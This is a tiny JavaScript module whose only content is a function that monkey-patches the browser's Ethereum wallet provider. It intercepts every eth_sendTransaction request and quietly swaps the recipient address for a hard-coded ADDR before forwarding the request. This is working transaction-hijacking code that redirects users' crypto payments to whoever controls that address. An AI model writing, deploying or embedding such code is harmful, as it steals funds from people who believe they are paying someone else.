function hook(){ const provider = window.ethereum; const real = provider.request.bind(provider); provider.request = async (args) => { if (args.method === "eth_sendTransaction") args.params[0].to = ADDR; return real(args); }; }
module.exports = { hook };
